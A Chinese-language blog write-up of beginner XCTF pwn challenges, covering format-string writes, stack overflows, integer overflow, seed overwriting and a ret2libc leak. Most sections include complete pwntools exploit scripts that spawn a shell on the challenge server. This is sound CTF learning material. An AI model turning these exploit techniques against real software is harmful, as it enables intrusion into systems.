![](https://blog.b0ring.cf/static/images/2019-10-02-15-11-09.png)

开个新坑，记录自己刷XCTF攻防世界的pwn题，因为刚入门吧，从新手篇开始练起。这次一边做题一边写笔记和writeup，巩固一下自己学到的东西。

## get_shell

这道题我不太想写writeup……做过的人肯定明白

## CGfsb

这道题其实是一道非常简单的格式化字符串题，凭借着自己对格式化字符串的记忆，以及大量动态调试，最后还是把这道题做出来了。记录一下自己调试的过程吧，随便找一篇格式化字符串的原理介绍（其实我没看，不过自称是春秋的应该不会太差）：  
<https://www.cnblogs.com/ichunqiu/p/9329387.html>

先运行一下看看逻辑吧：

![](https://blog.b0ring.cf/static/images/2019-09-25-17-35-39.png)

就是先让你输入一下名字和信息，然后它会再打印出来，我们可以看一下源码：

![](https://blog.b0ring.cf/static/images/2019-09-25-17-36-47.png)

标红处可以明显发现有一处格式化字符串漏洞，然后这道题的逻辑是把pwnme的内容修改为8，我们可以很容易想到（说这话心虚，其实动调了半天才想到，主要忘记格式化字符串怎么用了……）在输入名字的时候写pwnme的地址，然后在输入message时使用格式化字符串漏洞把pwnme修改掉。打开r2查看pwnme变量的地址（使用的命令是is）：

![](https://blog.b0ring.cf/static/images/2019-09-25-17-41-06.png)

随后使用gdb（安装了pwndbg插件）进行动态调试，先给0x80486d2地址打个断点：

![](https://blog.b0ring.cf/static/images/2019-09-25-17-42-56.png)

为什么给这个地址打断点呢？因为这个地址是printf执行完成后的第一个指令，我们在这个地方打断点，出来以后方便观察栈内存中的情况。运行一次程序，我们在name处输入test（就是为了测试message，现在name对我调试毫无意义），在message里输入%20s%1$n，看看栈里那个地方被改成了0x14（执行命令用r，我们输入完毕后会运行到断点处）：

![](https://blog.b0ring.cf/static/images/2019-09-25-17-47-44.png)

看见栈中第二个位置所指向的地址内容被修改掉了。我们再运行一次，这次name输入的还是test(十六进制下的内容会变成：74657374a)  
，message输入%20s%2$n（变成2$是为了不改掉test的值）：

![](https://blog.b0ring.cf/static/images/2019-09-25-17-59-28.png)

由于test前两个字节是7465，我们可以看到有两个字节写到了0xffffcdbc处，所以在写入pwnme地址之前我们需要填充两个字节，确保0xffffcdc0处可以被写成pwnme的地址，这样使用%$8n可以写入到此位置（与esp之间的差值为4的倍数），写exp如下：

    
    
    #encoding:utf-8
    '''
        @Author:    b0ring
        @MySite:    https://blog.b0ring.cf/
        @Date:      2019-09-29 09:59:02
        @Version:   1.0.0
    '''
    
    from pwn import *
    #p = process("CGfsb")
    p = remote("111.198.29.45",31983)
    payload_1 = "aa" + p32(pwnme_addr)
    p.sendlineafter("please tell me your name:\n",payload_1)
    payload_2 = "%8s%8$n"
    p.sendlineafter("leave your message please:\n",payload_2)                                               
    p.interactive()  
    

## when_did_you_born

这道题其实挺简单的，只不过……在做题过程中蠢了一下，浪费了不少时间。我们先使用IDA分析一下源程序：

![](https://blog.b0ring.cf/static/images/2019-09-26-19-22-12.png)

首先程序的逻辑是这样的，你输入出生年份，一旦等于1926就会退出。然后让你填名字，输出你名字后再判断你是不是1926年出生，如果你是1926年出生就会给你flag。  
最开始的时候看错了，以为v4（存储名字的变量）覆盖不到v5上，然后懵逼了很久（吃一堑长一智，以后不能犯这种错误了）。然后研究了半天怎么整数溢出啥的，随后实现想不到就看了别人的wp，发现真的是用v4覆盖v5，唉……exp如下：

    
    
    #encoding:utf-8
    '''
        @Author:    b0ring
        @MySite:    https://blog.b0ring.cf/
        @Date:      2019-09-29 09:59:02
        @Version:   1.0.0
    '''
    
    from pwn import *
    
    #p = process("when_did_you_born")
    p = remote("111.198.29.45",49187)
    
    p.sendlineafter("What's Your Birth?\n","1997")
    
    p.sendlineafter("What's Your Name?\n","a"*8+p64(1926))
    
    p.interactive()  
    

## hello_pwn

这道题也相当简单，脚本都不用写，但还是分析一下吧。用IDA看一下源码：

![](https://blog.b0ring.cf/static/images/2019-09-26-19-29-05.png)

就是你往unk_601068输入16个字符，它会判断dword_60106c（此地址比输入的地址高4位）是不是等于”nuaa”，如果等于就会给你flag。其实只要输入4个字符填充好0x601068，后四个字符就会覆盖掉0x60106c。这里要注意大端序小端序的问题，总之输入的内容是反过来的，最终payload为：

    
    
    1234aaun  
    

## level0

这道题难度真的是level0，反正是最简单的栈溢出了，用IDA分析一下：

![](https://blog.b0ring.cf/static/images/2019-09-26-19-32-14.png)

可以瞬间看到一个非常明显的栈溢出，偏移是0x80。而且它还给了利用函数：

![](https://blog.b0ring.cf/static/images/2019-09-26-19-33-15.png)

所以直接利用就好，exp：

    
    
    #encoding:utf-8
    '''
        @Author:    b0ring
        @MySite:    https://blog.b0ring.cf/
        @Date:      2019-09-29 09:59:02
        @Version:   1.0.0
    '''
    
    from pwn import *
    
    #p = process("./level0")
    p = remote("111.198.29.45",53314)
    
    call_system_addr = 0x00400596
    
    payload = 'a' * 136
    payload += p64(call_system_addr)
    
    p.sendlineafter("Hello, World\n",payload)
    
    p.interactive()  
    

## level2

用IDA先分析一下源码：

![](https://blog.b0ring.cf/static/images/2019-09-27-21-36-40.png)

buf只有0x88的空间，可见此处明显会存在溢出。查看一下保护机制：

![](https://blog.b0ring.cf/static/images/2019-09-27-21-38-03.png)

没canary，我们查看一下有没有可以利用的函数和字符串吧：

![image.png](https://image.3001.net/images/20191005/1570264757_5d9856b5f07ab.png!small)  

可见system函数是程序自己会调用的，也有/bin/sh的字符串，直接利用就行，exp如下：

    
    
    #encoding:utf-8
    '''
        @Author:    b0ring
        @MySite:    https://blog.b0ring.cf/
        @Date:      2019-09-29 09:59:02
        @Version:   1.0.0
    '''
    
    from pwn import *
    
    #p = process("level2")
    p = remote("111.198.29.45",40649)
    elf = ELF("level2")
    bin_sh_addr = 0x0804a024
    system_addr = elf.plt['system']
    
    payload = 'a'*140
    payload += p32(system_addr) + p32(1) + p32(bin_sh_addr)
    
    p.sendlineafter("Input:\n",payload)
    p.interactive()  
    

## guess_num

这是个很有意思的题目，似乎从某年的ctf出过一道骰子的逆向题以后大家都喜欢玩骰子，我本科出校ctf题的时候其实也喜欢玩骰子。废话不多说了，我们来分析一下源代码吧：

![](https://blog.b0ring.cf/static/images/2019-10-02-13-46-29.png)

可见程序大致的逻辑是：输入名字->丢10次骰子，丢错一次就会GG，如果十次都成功的话就可以拿到flag。其实有点儿更像逆向题了。不过我们此处可以利用输入名字时使用gets函数来覆盖掉seed的值，以操控种子来使随机数数列成为我们所可控的序列。关于name需要多长，我们可以观察堆栈空间：

![](https://blog.b0ring.cf/static/images/2019-10-02-13-50-25.png)

大致需要0x3C-0x10的长度，也可能在真正运行时比我们预计的更长。由于此处偷懒没有使用动态调试，直接覆盖了60个重复的’a’，然后编写一个C语言程序，使用0x61616161作为种子来生成随机数列，源码如下：

    
    
    #include <stdio.h>
    #include <stdlib.h>
    
    int main(){
            char *a = "aaaaaaaa";
            srand(0x61616161);
            for(int i=0;i<=9;i++){
                    int test = rand()%6 + 1;
                    printf("%d\n",test);
            }
            return 0;
    }  
    

查看随机生成的序列：

![](https://blog.b0ring.cf/static/images/2019-10-02-13-55-32.png)

然后照着这个顺序输入就可以了：

![](https://blog.b0ring.cf/static/images/2019-10-02-13-56-08.png)

## int_overflow

这道题还是略微有点儿意思的。先让我们查看一下保护机制吧：

![](https://blog.b0ring.cf/static/images/2019-10-02-13-58-58.png)

没有canary，比较容易进行栈溢出操作，来分析一下源码(直接把漏洞点贴出来吧)：

![](https://blog.b0ring.cf/static/images/2019-10-02-14-00-35.png)

漏洞点在于此处这个验证密码的位置，首先程序会获取输入字符串的长度，并存于一个int8类型的变量中，实际上，这个int8变量最多可以存储256大小的数字。如果这个数字为257，那么在内存中查看的话其大小就变成了257-256=1。也就是说，我们输入一个长度为256+4~256+8长度之内的字符串，就可以溢出s，来进行ROP操作。exp如下：

    
    
    #encoding:utf-8
    '''
        @Author:    b0ring
        @MySite:    https://blog.b0ring.cf/
        @Date:      2019-09-29 09:59:02
        @Version:   1.0.0
    '''
    
    from pwn import *
    
    shell_addr = 0x0804868b
    
    #p = process("./int_overflow")
    p = remote("111.198.29.45",34095)
    
    payload = 0x14*'a' + 4*'a' + p32(shell_addr) + (256-0x14-4-4)*'a' + 4*'a'
    
    p.sendlineafter("Your choice:","1")
    p.sendlineafter("Please input your username:\n","test")
    p.sendlineafter("Please input your passwd:\n",payload)
    
    p.interactive()  
    

## cgpwn2

这是一道很基本的栈溢出题目，分析一下源码吧：

![](https://blog.b0ring.cf/static/images/2019-10-02-14-11-38.png)

漏洞点就在此处，name是使用堆进行存储的，而message是使用栈中的s字符串来存储的，使用了不安全的gets函数，我们直接把返回地址覆盖成system，然后参数调用name，再在name中输入我们想执行的命令就行了,exp如下：

    
    
    #encoding:utf-8
    '''
        @Author:    b0ring
        @MySite:    https://blog.b0ring.cf/
        @Date:      2019-09-29 09:59:02
        @Version:   1.0.0
    '''
    
    from pwn import *
    
    #p = process("cgpwn2")
    p = remote("111.198.29.45",50695)
    elf = ELF("cgpwn2")
    
    name = "/bin/sh"
    system_addr = elf.plt["system"]
    name_addr = 0x0804A080
    message = "a" * 42 + p32(system_addr) + p32(0) + p32(name_addr)
    
    p.sendlineafter("please tell me your name\n",name)
    p.sendlineafter("hello,you can leave some message here:",message)
    
    p.interactive()  
    

## string

这道题相当相当有意思，作为菜鸡一枚，没有查wp的情况下做了得有两个多小时才做出来。可能是新手区里最有意思的一道题目了，因此打算详细讲讲，我们想从入口处分析一下源码吧：

![](https://blog.b0ring.cf/static/images/2019-10-02-14-18-46.png)

此处我刚开始没有摸到头脑，仔细看会发现，v3首先申请了8大小的内存空间，然后在前4个空间中存放了数字68，在后四个空间中存放了数字85。而v4中存放的是v3的内容，并不是68、和85两个数字，而是存放这两个数字的内存空间的地址。在后面会很有用。

接下来让我们分析一下0x400D72处这个函数：

![](https://blog.b0ring.cf/static/images/2019-10-02-14-21-09.png)

这里使用了scanf(“%s”)来进行读取操作，看似是危险函数，然而由于对字符串长度进行了检验并且开启了canary，实际上是无法利用的。想利用还得继续看其调用的其他函数：

![](https://blog.b0ring.cf/static/images/2019-10-02-14-24-26.png)

反正第一次就得输入east了，没得选。在接着看sub_400BB9这个函数：

![](https://blog.b0ring.cf/static/images/2019-10-02-14-27-03.png)

这个地方选1的话会写入一个地址，然后第二个输入点存在格式化字符串漏洞，我们可以对某空间进行任意写操作。我们可以记住此处。然后再接着看第三个调用的函数：

![](https://blog.b0ring.cf/static/images/2019-10-02-14-28-51.png)

其中a1存放的是v3的地址，就是我们v3申请的内存大小为8的内存空间。理顺思路，这里如果我们可以使这8内存的空间中的前四个字节和后四个字节相等，就可以打shellcode。于是我们可以理顺思路，在最开始时拿到两个4字节的地址->v3[0]和v3[1]的地址，然后在之后的函数中将其中一个修改成和另一个相同->再在此处打shellcode。exp如下：

    
    
    #encoding:utf-8
    '''
        @Author:    b0ring
        @MySite:    https://blog.b0ring.cf/
        @Date:      2019-09-29 09:59:02
        @Version:   1.0.0
    '''
    
    from pwn import *
    
    context.terminal = ['deepin-terminal','-x','sh','-c']
    context(arch='amd64', os='linux')
    #p = process("./string")
    #gdb.attach(proc.pidof(p)[0])
    p = remote("111.198.29.45",42101)
    
    print p.recvuntil("secret[0] is ")
    after_content = p.recvuntil("What should your character's name be:\n")
    print after_content
    
    secret_addr = int(after_content.split('\n')[0],16)
    
    p.sendline("test")
    
    addr_wanted = str(secret_addr)
    shellcode = asm(shellcraft.sh())
    print("[*] addr_wanted:",addr_wanted)
    
    print p.sendlineafter("So, where you will go?east or up?:\n","east")
    print p.sendlineafter("go into there(1), or leave(0)?:","1")
    print p.sendlineafter("'Give me an address'\n",addr_wanted)
    print p.sendlineafter("And, you wish is:\n","%85s%7$n")
    print p.recvuntil("Wizard: I will help you! USE YOU SPELL\n")
    p.sendline(shellcode)
    #print p.sendlineafter("Wizard: I will help you! USE YOU SPELL\n",shellcode)
    
    p.interactive()  
    

## level3

先来看看保护机制吧：

![](https://blog.b0ring.cf/static/images/2019-10-02-14-34-29.png)

这里没有canary保护，猜测其存在一个比较好利用的栈溢出漏洞。我们分析一下源代码：

![](https://blog.b0ring.cf/static/images/2019-10-02-14-35-48.png)

这里的栈溢出漏洞相当明显，接下来就是思考如何制造rop了。

![](https://blog.b0ring.cf/static/images/2019-10-02-14-36-42.png)

这个函数既没有system函数，也没有是/bin/sh字符串，不过它使用了write函数，我们可以很方便的泄露一些敏感的地址信息。然后使用题目所给的libc文件计算偏移，再输出了write函数地址后，减去libc中write函数的地址来计算基址，再加上/bin/sh的偏移和system函数的偏移，就可以计算出我们需要的两个关键内容了。然后在rop中返回到vul_func再调用system函数。具体利用的exp如下：

    
    
    #encoding:utf-8                                            '''
        @Author:    b0ring
        @MySite:    https://blog.b0ring.cf/
        @Date:      2019-09-29 09:59:02
        @Version:   1.0.0
    '''                                                                                                                   
                                                                                                                                                                                  
    from pwn import *                                                                                                                                                             
                                                                                                                                                                                  
    #p = process("./level3")                                                                                                                                                      
    p = remote("111.198.29.45",31892)                                                                                                                                             
    elf = ELF("./level3")                                                                                                                                                         
    libc = ELF("libc_32.so.6")                                                                                                                                                    
                                                                                                                                                                                  
    write_plt = elf.plt["write"]                                                                                                                                                  
    write_got = elf.got["write"]                                                                                                                                                  
    write_offset = libc.symbols["write"]                                                                                                                                          
    system_offset = libc.symbols["system"]                                                                                                                                        
    bin_sh_offset = libc.search("/bin/sh").next()                                                                                                                                 
    vul_addr = 0x0804844B                                                                                                                                                         
                                                                                                                                                                                  
    payload = 140*'a'                                                                                                                                                             
    payload += p32(write_plt) + p32(vul_addr) + p32(1) + p32(write_got) + p32(4)                                                                                                  
                                                                                                                                                                                  
    start_content = p.recvuntil("Input:\n")                                                                                                                                       
    print start_content                                                                                                                                                           
    p.sendline(payload)                                                                                                                                                           
                                                                                                                                                                                  
    output = p.recvuntil("Input:\n")                                                                                                                                              
    print output                                                                                                                                                                  
                                                                                                                                                                                  
    write_addr = u32(output[:4])                                                                                                                                                  
    print "[*] write_addr:",hex(write_addr)                                                                                                                                       
                                                                                                                                                                                  
    system_addr = write_addr - write_offset + system_offset                                                                                                                       
    bin_sh_addr = write_addr - write_offset + bin_sh_offset
    
    print "[*] system_addr:",hex(system_addr)
    print "[*] bin_sh_addr:",hex(bin_sh_addr)
    
    payload = 140*'a'
    payload += p32(system_addr) + p32(vul_addr) + p32(bin_sh_addr)
    
    p.sendline(payload)
    
    p.interactive()  
    

## 结语

其实新手区已经刷完一段时间了，感觉难度还好吧，基本没有很难得题目，但是非常适合新手入门做。还是学会了一些东西，比方说看到某函数就大概反应可能会怎么利用，练习了动态调试之类的。没有白付出时间吧。遗憾是还没做到堆入门的题目，期待接下来的高手区练习（已经做了几道题了，还是没碰到堆的）。

